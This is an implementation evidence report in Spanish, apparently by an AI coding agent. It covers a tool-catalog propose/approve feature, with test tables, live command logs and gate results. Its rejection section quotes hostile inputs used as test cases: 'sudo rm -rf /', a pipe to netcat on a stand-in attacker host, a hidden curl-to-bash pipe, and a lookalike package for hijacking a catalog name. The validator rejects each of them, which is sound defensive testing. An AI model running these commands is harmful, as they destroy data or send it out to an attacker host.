# P5-tools-discovery — evidencia del implementer

Feature 019-harness-evolution, PKG-5 (AC-30..AC-35, ADR-0038). Último paquete de la feature; el único
que toca `coord_policy.py`. **Esta instancia es un relanzamiento**: la anterior murió por un stall de
infraestructura (`no progress for 600s`) sin dejar nada en disco (verificado al arrancar: no había
`docs/adr/0038-*`, ninguna mención de `tools-propose`/`tools.local.toml` en código ni tests). Este
archivo se escribió en incrementos visibles desde antes de tocar código de producción (ADR-0038 primero,
tests después, código al final), tal como pedía el encargo.

## Estado: COMPLETO

`./build.sh --check` re-confirmado sin drift, suite de tools/coord_policy re-corrida en verde, sin
residuos de `BITE-TEST-NEUTRALIZED`, `git status --porcelain` limpio de `tools.local.toml`/
`tools.proposals.json` — todo verificado con el comando pegado inmediatamente antes de cerrar esta
evidencia (ver §6/§7).

## 1. Tabla AC → cambio → prueba

| AC | Cambio (`archivo:línea`) | Prueba |
|---|---|---|
| AC-30 (`--tools-propose`, no instala, no muta el catálogo) | `ai/scripts/set_agents_app.py:1287-1328` `cmd_tools_propose` · `:1402-1439` `_parse_tools_propose_argv` (walker manual, `--install-<method>` es un nombre de flag dinámico que argparse no puede declarar) · `:1215-1233` `_validate_install_command` (sudo/pipe oculto/`Global/_canonical`) · `:2862-2870` intercepción en `main()` antes del parser | `tests/test_harness.py` `test_cmd_tools_propose_rejects_bad_name_kind_and_command_without_staging_anything`, `test_cmd_tools_propose_stages_a_pending_proposal_and_prints_the_consolidated_question`, `test_validate_install_command_rejects_sudo_and_hidden_pipes_but_allows_the_curated_shape`, `test_parse_tools_propose_argv_extracts_fields_and_rejects_malformed_shapes` |
| AC-31 (`--tools-approve <name>` → `tools.local.toml`, merge en `load_catalog`, `log-decision`, instalación sin cambios de postura) | `:1183-1195` `load_catalog` (merge, curado gana) · `:1169-1181` `_load_local_catalog` (never-fails) · `:1359-1400` `cmd_tools_approve` · `:1330-1354` `_log_tool_decision` (subprocess a `feature-state.py log-decision`) · `:1444-1449` `_parse_tools_approve_argv` (gramática = solo el nombre) · `.gitignore:40-43` (`tools.local.toml`/`tools.proposals.json`) | `test_cmd_tools_approve_full_round_trip_reaches_load_catalog_and_tools_install`, `test_cmd_tools_approve_without_a_pending_proposal_is_rejected`, `test_cmd_tools_approve_refuses_to_shadow_a_curated_name`, `test_load_catalog_merges_tools_local_toml_and_curated_always_wins_on_collision`, `test_load_catalog_never_fails_without_tools_local_toml`, `test_parse_tools_approve_argv_is_name_only` — más el round-trip vivo (§2) |
| AC-32 (`TOOL_UNKNOWN` deja de ser callejón sin salida, token pineado se mantiene) | `:1524-1529` `cmd_tools_install` (mismo token `TOOL_UNKNOWN`, cola nueva) | `test_tool_unknown_now_suggests_the_propose_flow_instead_of_a_dead_end` (nuevo) + `tests/test_harness.py:773` `test_set_agents_tools_catalog` (preexistente, `assertIn("TOOL_UNKNOWN", ...)`, sigue en verde sin tocarla) |
| AC-33 (`coord_policy._tools_channel_allowed` extiende el walker; `--tools-approve` fuera) | `ai/scripts/coord_policy.py:170-186` `_INSTALL_METHOD_FLAG`/`_TOOLS_PROPOSE_REQUIRED` · `:188-212` `_tools_propose_allowed` · `:244-247` ramas `--tools-propose`/`--tools-approve` en `_tools_channel_allowed` · `ai/scripts/generate.py:253-261` deny explícito `--tools-approve*` en el permission map OpenCode (más grueso que el walker) | `tests/test_autonomy_policy.py` `ToolsProposeChannelPolicyTests` (3 tests) + `GeneratedPermissionTests.test_opencode_orchestrator_denies_tools_approve_despite_the_coarser_tools_glob` |
| AC-34 (skills solo project-local; `Global/_canonical/` fuera de alcance como destino) | `ai/scripts/set_agents_app.py:1226-1233` `_CANONICAL_TARGET_RE` en `_validate_install_command`, aplicado a los 3 kinds (más restrictivo que solo `skill`) · `docs/adr/0038-tools-catalog-discovery.md` §7 | `test_validate_install_command_rejects_sudo_and_hidden_pipes_but_allows_the_curated_shape` (caso `Global/_canonical/skills/...`) |
| AC-35 (doctrina + consola) | `Global/_canonical/agents/orchestrator.md:648-654` (bullet nuevo en `## Tool catalog`) · `Global/_canonical/agents/implementer.md:65-69` (bullet nuevo en Resolve-first) · `ai/scripts/set_agents_app.py:2611-2653` `tools_propose_menu` · `:2769-2779` `MENU_ITEMS` (ítem "➕ Proponer herramienta nueva" entre Herramientas y MCPs) · `:2841-2852` dispatch renumerado en `menu()` | `tests/test_autonomy_policy.py` `test_tool_catalog_doctrine_covers_the_open_catalog_flow` · `tests/test_harness.py` `test_tools_propose_menu_chains_prompts_and_calls_cmd_tools_propose`, `test_tools_propose_menu_cancelling_name_never_reaches_cmd_tools_propose`, `test_menu_items_include_proponer_herramienta_between_tools_and_mcp`, `test_menu_dispatches_the_proponer_item_to_tools_propose_menu` |

ADR-0038 nuevo (`docs/adr/0038-tools-catalog-discovery.md`), indexado en `docs/adr/README.md:45`.

## 2. Round-trip vivo (propose → approve → catalogado → install)

Corrido en una raíz aislada (nunca contra el repo real — ver §7 sobre por qué), copiando solo
`tools.toml` y apuntando `SET_AGENTS_ROOT` ahí:

```
$ RT=/var/tmp/.../roundtrip-root2 && cd "$RT" && export SET_AGENTS_ROOT="$RT"

$ python3 .../set_agents_app.py --tools-propose demo-tool --kind cli --detect demo-tool \
    --install-npm "npm install -g demo-tool" --why "necesito demo-tool para probar el round-trip de ADR-0038"
TOOLS_PROPOSE_OK demo-tool
  kind=cli
  detect=demo-tool
  install.npm=npm install -g demo-tool
  why=necesito demo-tool para probar el round-trip de ADR-0038
¿Aprobás agregar 'demo-tool' al catálogo de herramientas? Esto NO instala nada todavía.
Requiere una persona -- un agente no puede correr esto (ADR-0038). Para aprobar:
  python3 ai/scripts/set_agents_app.py --tools-approve demo-tool
rc=0

$ python3 .../set_agents_app.py --tools-approve demo-tool
{
  "deduped": false,
  "entry": { "actor": "tools-approve", "at": "2026-08-11T18:31:06+00:00",
    "consequences": "Disponible vía --tools/--tools-install tras el approve; sudo sigue siempre manual.",
    "context": "--tools-approve demo-tool (kind=cli) -- flujo ADR-0038 propose -> aprobación humana -> approve.",
    "decision": "Se aprobó agregar 'demo-tool' (kind=cli) a tools.local.toml. Motivo: necesito demo-tool para probar el round-trip de ADR-0038",
    "feature_id": "", "package_id": "", "slug": "herramienta-de-catálogo-aprobada-demo-tool",
    "title": "Herramienta de catálogo aprobada: demo-tool" },
  "log_file": "ai/state/decisions-log.jsonl", "ok": true
}
TOOLS_APPROVE_OK demo-tool kind=cli
Para instalar: python3 ai/scripts/set_agents_app.py --tools-install demo-tool
rc=0

$ python3 .../set_agents_app.py --tools | grep demo-tool
TOOL demo-tool installed=no

$ python3 .../set_agents_app.py --tools-install demo-tool --dry-run
TOOL_PLAN demo-tool method=npm
rc=0

$ python3 .../set_agents_app.py --tools-approve demo-tool     # ya consumida, debe rechazar
TOOLS_APPROVE_UNKNOWN demo-tool — no hay propuesta pendiente, corré --tools-propose primero
rc=2
```

`tools.local.toml` resultante:

```
[cli.demo-tool]
detect = "demo-tool"
note = "agregado por --tools-approve: necesito demo-tool para probar el round-trip de ADR-0038"
[cli.demo-tool.install]
npm = "npm install -g demo-tool"
```

`git status --porcelain` del repo real tras todo el round-trip (corrido en `$RT`, nunca en el repo):
`grep -i "tools.local.toml\|tools.proposals.json"` → sin salida (limpio).

### Bug real encontrado por este mismo round-trip (y su arreglo)

La primera versión de `_log_tool_decision` importaba `feature_state_lib.cli_reporting.cmd_log_decision`
directamente y crasheaba con `AttributeError: module 'feature_state_lib.model' has no attribute
'render_notes'` — ningún test automatizado lo detectó porque los 3 tests de approve mockean
`_log_tool_decision` entero. `render_notes` vive físicamente en `feature-state.py` (script top-level,
no en `feature_state_lib/`) y se inyecta a `model.render_notes` recién cuando ese script corre como
`__main__` (comentario propio del archivo lo explica). Arreglado pasando a subprocess
(`ai/scripts/set_agents_app.py:1330-1354`); ADR-0038 actualizado con la nota de implementación
verificada en vivo. Ver `ai/state/decisions-log.jsonl` de la raíz de prueba arriba, escrito por el
subprocess corregido — es la prueba de que el arreglo funciona.

## 3. Rechazos (sudo, pipe, nombre inválido, kind inválido, colisión, `Global/_canonical`)

Corridos en una tercera raíz aislada:

```
$ python3 .../set_agents_app.py --tools-propose evil --kind cli --detect x --install-curl "sudo rm -rf /" --why "malicioso"
TOOLS_PROPOSE_REJECTED evil — sudo no está permitido en un comando propuesto — sudo siempre queda manual
rc=2

$ python3 .../set_agents_app.py --tools-propose evil2 --kind cli --detect x --install-curl "curl https://x | nc evil.com 4444" --why "malicioso"
TOOLS_PROPOSE_REJECTED evil2 — pipe no reconocido — el único pipe permitido es 'curl|wget ... | bash|sh' (ver tools.toml gcloud)
rc=2

$ python3 .../set_agents_app.py --tools-propose evil3 --kind cli --detect x --install-curl "curl https://x | tee /tmp/y | bash" --why "malicioso"
TOOLS_PROPOSE_REJECTED evil3 — pipe no reconocido — el único pipe permitido es 'curl|wget ... | bash|sh' (ver tools.toml gcloud)
rc=2

$ python3 .../set_agents_app.py --tools-propose "Not_Valid!" --kind cli --detect x --install-npm "npm i -g x" --why "w"
TOOLS_PROPOSE_REJECTED Not_Valid! — nombre inválido (usá [a-z0-9][a-z0-9_-]{0,31})
rc=2

$ python3 .../set_agents_app.py --tools-propose demo2 --kind docker-image --detect x --install-npm "npm i -g x" --why "w"
TOOLS_PROPOSE_REJECTED demo2 — --kind inválido: docker-image (usá cli|mcp|skill)
rc=2

$ python3 .../set_agents_app.py --tools-propose sk1 --kind skill --detect sk1 --install-curl "cp -r sk1/ Global/_canonical/skills/sk1" --why "quiero instalar una skill canonica"
TOOLS_PROPOSE_REJECTED sk1 — un comando propuesto no puede instalar dentro de Global/_canonical (ADR-0038 §7)
rc=2

# El caso que SÍ debe pasar (el pipe legítimo, misma forma que tools.toml gcloud):
$ python3 .../set_agents_app.py --tools-propose gclike --kind cli --detect gclike --install-curl "curl -sSL https://sdk.example.com/install.sh | bash" --why "instalador legitimo tipo gcloud"
TOOLS_PROPOSE_OK gclike
rc=0

# Colisión con el catálogo curado (vercel ya existe en tools.toml):
$ python3 .../set_agents_app.py --tools-propose vercel --kind cli --detect vercel --install-npm "npm install -g vercel-evil" --why "quiero secuestrarlo"
TOOLS_PROPOSE_OK vercel
rc propose=0
$ python3 .../set_agents_app.py --tools-approve vercel
TOOLS_APPROVE_REJECTED vercel — colisiona con el catálogo curado (tools.toml); el curado siempre gana, elegí otro nombre
rc approve=2
$ ls tools.local.toml
ls: no se puede acceder a 'tools.local.toml': No existe el fichero o el directorio   # correcto -- no existe
```

## 4. Caso adversario `coord_policy` (AC-33)

`tests/test_autonomy_policy.py::ToolsProposeChannelPolicyTests`:

- `test_tools_approve_is_never_allowed_in_the_agent_channel` — `--tools-approve foo` (bare), con el
  payload completo de propose pegado atrás, y sin argumentos: las tres formas rechazadas por
  `coord_policy.allowed(...)`. Incluye la verificación directa pedida por el context pack:
  `self.assertFalse(coord_policy._tools_channel_allowed(["python3", APP, "--tools-approve", "foo"]))`.
- `test_tools_propose_adversarial_argv_is_denied` — el shape SEC-001 (`--scaffold`/`--yes` colgando
  después de satisfacer la gramática completa), flags duplicadas, dos `--install-<method>`, nombre con
  `../`, y `--install-../etc` (patrón de flag no reconocido).
- `GeneratedPermissionTests.test_opencode_orchestrator_denies_tools_approve_despite_the_coarser_tools_glob`
  — el lane OpenCode (glob más grueso que el walker) también niega `--tools-approve*`, después del
  `--tools*: allow` que si no lo tapara por prefijo.

Corrida real:

```
$ python3 -m unittest tests.test_autonomy_policy -v
...
test_tools_approve_is_never_allowed_in_the_agent_channel ... ok
test_tools_propose_adversarial_argv_is_denied ... ok
test_tools_propose_well_formed_grammar_is_allowed ... ok
test_opencode_orchestrator_denies_tools_approve_despite_the_coarser_tools_glob ... ok
...
Ran 14 tests in 0.017s
OK
```

## 5. Prueba de mordida (bite) — las 20 pruebas nuevas, una por una

Metodología (igual a P1-P4): por cada test nuevo, (a) neutralizar el cambio de producción que assertea,
(b) confirmar rojo con `python3 -m unittest discover -s tests -k <nombre>`, (c) revertir con el mismo
texto exacto, (d) confirmar verde de nuevo. `discover` (no aislado) para evitar el `KeyError:
'set_agents_app'` preexistente de import.

| # | Test | Neutralización | Resultado en rojo |
|---|---|---|---|
| 1 | `test_tools_propose_well_formed_grammar_is_allowed` | `_tools_propose_allowed` → `return False` | `AssertionError: False is not true` |
| 2 | `test_tools_propose_adversarial_argv_is_denied` | `_tools_propose_allowed` → `return True` | `AssertionError: True is not false` |
| 3 | `test_tools_approve_is_never_allowed_in_the_agent_channel` | rama `--tools-approve` → `return True` | `AssertionError: True is not false` |
| 4 | `test_opencode_orchestrator_denies_tools_approve_despite_the_coarser_tools_glob` | se quitó la línea `deny` de `generate.py` + `./build.sh` | `AssertionError: '...--tools-approve*": deny' not found` |
| 5 | `test_tool_catalog_doctrine_covers_the_open_catalog_flow` | se quitó el bullet ADR-0038 de `implementer.md` | `AssertionError: 'ADR-0038' not found` |
| 6 | `test_tool_unknown_now_suggests_the_propose_flow_instead_of_a_dead_end` | mensaje `TOOL_UNKNOWN` vuelto al texto viejo | `'--tools-propose ghost-tool' not found in 'TOOL_UNKNOWN ghost-tool — agregalo en tools.toml\n'` |
| 7 | `test_validate_install_command_rejects_sudo_and_hidden_pipes_but_allows_the_curated_shape` | (a) `if _SUDO_RE...` → `if False and ...`; (b) chequeo de pipe → `if False`; (c) chequeo `Global/_canonical` → `if False and ...` (3 corridas independientes) | (a) `sudo rm -rf /` deja de rechazarse; (b) 3 casos de pipe oculto dejan de rechazarse; (c) el caso `Global/_canonical` deja de rechazarse |
| 8 | `test_cmd_tools_propose_rejects_bad_name_kind_and_command_without_staging_anything` | chequeo de `_CATALOG_NAME` → `if False` | `rc == 0` en vez de `2` para el nombre inválido |
| 9 | `test_cmd_tools_propose_stages_a_pending_proposal_and_prints_the_consolidated_question` | se comentó `_write_tools_proposal(...)` | `FileNotFoundError: tools.proposals.json` |
| 10 | `test_cmd_tools_approve_full_round_trip_reaches_load_catalog_and_tools_install` | se comentó el `atomic_write` de `tools.local.toml` | `KeyError: 'newtool'` en `load_catalog()` |
| 11 | `test_cmd_tools_approve_without_a_pending_proposal_is_rejected` | `if proposal is None:` → `if False:` | `AttributeError: 'NoneType' object has no attribute 'get'` |
| 12 | `test_cmd_tools_approve_refuses_to_shadow_a_curated_name` | chequeo de colisión → `if False` | `rc == 0` en vez de `2` |
| 13 | `test_load_catalog_merges_tools_local_toml_and_curated_always_wins_on_collision` | `merged.setdefault(name, entry)` → `merged[name] = entry` | `'vercel-evil' != 'vercel'` |
| 14 | `test_load_catalog_never_fails_without_tools_local_toml` | se quitó el `if not path.is_file(): return {}` | `FileNotFoundError: tools.local.toml` |
| 15 | `test_parse_tools_propose_argv_extracts_fields_and_rejects_malformed_shapes` | se quitó el chequeo de flag repetida | `ValueError not raised` para `--kind` duplicado |
| 16 | `test_parse_tools_approve_argv_is_name_only` | `len(rest) != 1` → `len(rest) > 2` | `IndexError` en un caso, `ValueError not raised` en otro |
| 17 | `test_tools_propose_menu_chains_prompts_and_calls_cmd_tools_propose` | se comentó la llamada final a `cmd_tools_propose` | `Expected 'cmd_tools_propose' to be called once. Called 0 times.` |
| 18 | `test_tools_propose_menu_cancelling_name_never_reaches_cmd_tools_propose` | se insertó una llamada incondicional a `cmd_tools_propose` al principio de la función | `Expected 'cmd_tools_propose' to not have been called. Called 1 times.` |
| 19 | `test_menu_items_include_proponer_herramienta_between_tools_and_mcp` | se quitó el ítem de `MENU_ITEMS` | `StopIteration` (índice no encontrado) |
| 20 | `test_menu_dispatches_the_proponer_item_to_tools_propose_menu` | mismo quite de `MENU_ITEMS` (una sola neutralización cubre ambos 19 y 20) | `StopIteration` |

Todas revertidas al texto original exacto; `git diff --stat` tras el ciclo completo solo muestra las
adiciones legítimas (sin residuos `BITE-TEST-NEUTRALIZED`). Verificado:
`grep -rn "BITE-TEST-NEUTRALIZED" ai/scripts/ Global/` → sin resultados (ver comando pegado en §7).

## 6. Gates

```
$ ./build.sh
CHECK_PASS: generated and validated profile go-zen
Generated tracked artifacts for go-zen.

$ ./build.sh --check
CHECK_PASS: generated and validated profile go-zen
SELF_SCAFFOLD_SYNC_OK files=2

$ python3 -m unittest discover -s tests
...
Ran 883 tests in 696.823s
OK (skipped=3)
```

Base declarada por el context pack: 863 OK / 3 skips. Ahora 883 OK / 3 skips — sube exactamente en 20, el
número de tests nuevos de este paquete (§5); nunca baja.

```
$ git diff --check -- ai/scripts/set_agents_app.py ai/scripts/coord_policy.py ai/scripts/generate.py \
    .gitignore Global/_canonical/agents/orchestrator.md Global/_canonical/agents/implementer.md \
    tests/test_harness.py tests/test_autonomy_policy.py docs/adr/0038-tools-catalog-discovery.md \
    docs/adr/README.md docs/specs/019-harness-evolution/evidence/P5-implementer.md
<sin salida, rc=0>

$ git status --porcelain | grep -i "tools.local.toml\|tools.proposals.json"
<sin salida = limpio>

$ ./ai/scripts/verify.sh
CHECK_PASS: generated and validated profile go-zen
...
Ran 883 tests in 689.714s
OK (skipped=3)
...
GLOBAL_PORTABILITY_OK
CANONICAL_PATHS_OK
FEATURE_STATE_OK
VERIFY_PASS
```

(`verify.sh` corre su propia pasada completa de `discover -v` + `build.sh --check` + `py_compile` +
`git diff --check` + diff estructural de los 4 árboles generados + los checks de portabilidad/paths
canónicos/feature-state — todo en verde, `VERIFY_EXIT=0`.)

## 7. Verificación de limpieza (residuos de la prueba de mordida)

```
$ grep -rn "BITE-TEST-NEUTRALIZED" ai/scripts/ Global/ tests/
<sin salida>
```

## Riesgos conocidos / decisiones documentadas en el ADR

- `kind=mcp`/`kind=skill` quedan catalogados con el mismo esquema `detect`+`install.<method>` que `cli`,
  pero NO se integran automáticamente con `cmd_mcp_add` (que espera `type`/`command`/`url`) ni con un
  instalador de skills real — deliberado y explícito en ADR-0038 (Rejected alternatives), ningún AC-30..35
  lo pide. Solo `kind=cli` recorre el camino completo `propose → approve → --tools → --tools-install`,
  que es exactamente lo que el round-trip de evidencia ejercita.
- El pipe legítimo exige EXACTAMENTE `| bash` o `| sh` sin argumentos extra (`bash -s --` no pasa) — más
  restrictivo que algunos instaladores reales; documentado como elección deliberada en el ADR
  ("Rejected alternatives"), fácil de aflojar después.
- `--tools-approve` nunca entra al canal del agente en ningún lane (Claude Code vía `coord_policy.py`,
  OpenCode vía el `deny` explícito en `generate.py`); Codex ya lo cubre por `sandbox_mode = "read-only"`
  (aprobación humana por construcción); Pi no tiene `coord_policy.py` propio y hereda la recomendación
  solo como texto doctrinal.

  **CORRECCIÓN (repair, F-07, ver `P5-repair.md`)**: la afirmación de arriba es FALSA para roles writer.
  `coord_policy.py`/el `deny` de `generate.py` en `ai/scripts/generate.py` (capability `coord-ro`) solo
  gatean el canal del **orquestador** en Claude Code/OpenCode — nunca el del implementer, que en OpenCode
  tiene bash `"*": allow` con un denylist corto (sudo/`rm -rf`/`git push --force`/`gh repo delete`, sin
  `--tools-approve`), en Codex corre con `sandbox_mode = "workspace-write"` (no `read-only` — esa
  distinción es del orquestador, no del implementer), y en Pi no tiene ninguna policy de bash. La
  invariante real es DOCTRINAL para esos roles ("nunca es tuyo para correr, sea cual sea tu rol"), no
  técnica — ver ADR-0038 §2 (actualizado) para el alcance correcto por clase de capability.
